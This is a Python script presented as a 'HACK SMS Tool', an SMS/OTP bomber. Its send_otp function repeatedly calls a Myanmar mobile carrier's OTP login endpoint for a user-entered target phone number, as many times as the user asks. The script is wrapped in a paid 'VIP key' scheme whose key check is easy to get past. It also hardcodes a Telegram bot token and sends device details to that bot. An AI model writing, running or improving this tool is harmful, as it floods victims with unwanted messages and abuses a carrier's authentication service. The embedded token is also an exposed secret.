#!/usr/bin/env python3
import requests, time, sys, hashlib, os, platform, subprocess, json

BOT_TOKEN = "8700243285:AAEvVldxc_YeDqZ6FItFnWhcg-18kexzFnw"
KEY_FILE = os.path.join(os.path.expanduser("~"), ".hack_vip_key.json")
# Online Key နေရာကို ထည့်သွင်းထားသည်
ONLINE_KEY_URL = "https://raw.githubusercontent.com/hhtethtet277-svg/moeyu/refs/heads/main/key.txt"

def get_model():
    try:
        model = subprocess.getoutput('getprop ro.product.model').strip()
        if not model or "not found" in model.lower():
            model = platform.machine()
        return model
    except:
        return platform.system()

def get_id():
    info = platform.processor() + platform.node() + platform.machine()
    return "DEV-" + hashlib.md5(info.encode()).hexdigest().upper()[:8]

def banner():
    os.system('clear')
    print("\033[1;32m")
    print(r"  _   _    _    ____ _  __    ____  __  __ ____  ")
    print(r" | | | |  / \  / ___| |/ /   / ___||  \/  / ___| ")
    print(r" | |_| | / _ \| |   | ' /    \___ \| |\/| \___ \ ")
    print(r" |  _  |/ ___ \ |___| . \     ___) | |  | |___) |")
    print(r" |_| |_/_/   \_\____|_|\_\   |____/|_|  |_|____/ ")
    print("\n    >>> HACK SMS Tool <<<")
    print("\033[1;37m" + "="*50)
    d_id = get_id()
    model = get_model()
    print(f"[*] Device ID : \033[1;36m{d_id}\033[1;37m")
    print(f"[*] Model     : {model}")
    print("="*50 + "\033[0m")
    return d_id, model

def send_tg(d_id, model):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates"
        resp = requests.get(url).json()
        if resp.get("result"):
            chat_id = resp["result"][-1]["message"]["chat"]["id"]
            msg = (f"🚨 New VIP Request 🚨\n"
                   f"Model: {model}\n"
                   f"ID: {d_id}\n\n"
                   f"Keys:\n"
                   f"1D: HACK-{d_id}-D1\n"
                   f"3D: HACK-{d_id}-D3\n"
                   f"5D: HACK-{d_id}-D5\n"
                   f"7D: HACK-{d_id}-D7\n"
                   f"15D: HACK-{d_id}-D15\n"
                   f"30D: HACK-{d_id}-D30")
            requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", data={"chat_id": chat_id, "text": msg})
    except: pass

def check_online_keys(d_id):
    try:
        response = requests.get(ONLINE_KEY_URL, timeout=10)
        if response.status_code == 200:
            valid_keys = [line.strip() for line in response.text.splitlines() if line.strip()]
            for key in valid_keys:
                if key.startswith("HACK-") and d_id in key:
                    return True, key
    except: pass
    return False, None

def save_key(key):
    data = {"key": key, "activated_at": time.time()}
    try:
        with open(KEY_FILE, "w") as f: json.dump(data, f)
    except: pass

def get_saved_key():
    if os.path.exists(KEY_FILE):
        try:
            with open(KEY_FILE, "r") as f: return json.load(f)
        except: pass
    return None

def is_key_valid(key_data, d_id):
    if not key_data: return False
    key = key_data.get("key", "")
    activated_at = key_data.get("activated_at", 0)
    if not (key.startswith("HACK-") and d_id in key): return False
    try:
        days = int(key.split("-D")[-1])
        if time.time() < (activated_at + (days * 86400)): return True
    except: pass
    return False

def auth(d_id):
    # Online စစ်ဆေးခြင်း
    online_valid, key = check_online_keys(d_id)
    if online_valid:
        save_key(key)
        return True
        
    # Local စစ်ဆေးခြင်း
    saved = get_saved_key()
    if is_key_valid(saved, d_id): return True
        
    while True:
        key = input("\n[?] Enter VIP Key: ").strip()
        if key.startswith("HACK-") and d_id in key:
            save_key(key)
            print("\033[1;32m[+] Key Accepted!\033[0m")
            time.sleep(1)
            return True
        print("\033[1;31m[!] Invalid Key!\033[0m")

def send_otp(p, c):
    url = "https://apis.mytel.com.mm/myid/authen/v1.0/login/method/otp/get-otp?phoneNumber={}"
    print(f"\n[*] Sending {c} OTP to {p}...")
    for i in range(c):
        try:
            requests.get(url.format(p))
            print(f"[{i+1}/{c}] Done")
        except: pass
        time.sleep(0.05)
    input("\nPress Enter to return...")

def show_key_info(d_id):
    saved = get_saved_key()
    print("\n" + "="*35)
    if is_key_valid(saved, d_id):
        key = saved["key"]
        days = int(key.split("-D")[-1])
        expiry_time = saved["activated_at"] + (days * 86400)
        rem = expiry_time - time.time()
        print(f"[*] Key: {key}\n[*] Status: Active\n[*] Expire: {int(rem//86400)}D {int((rem%86400)//3600)}H")
    else: print("\033[1;31m[!] No active key.\033[0m")
    input("\nPress Enter...")

def main_menu(d_id, model):
    while True:
        banner()
        print(" [1] SMS Tool\n [2] View VIP Key\n [0] Exit")
        choice = input("\n[?] Option: ").strip()
        if choice == '1':
            p = input("\n[?] Target Phone: ")
            try: send_otp(p, int(input("[?] Count: ")))
            except: pass
        elif choice == '2': show_key_info(d_id)
        elif choice == '0': sys.exit()

if __name__ == '__main__':
    try:
        d_id, model = banner()
        if auth(d_id): main_menu(d_id, model)
    except KeyboardInterrupt: sys.exit()
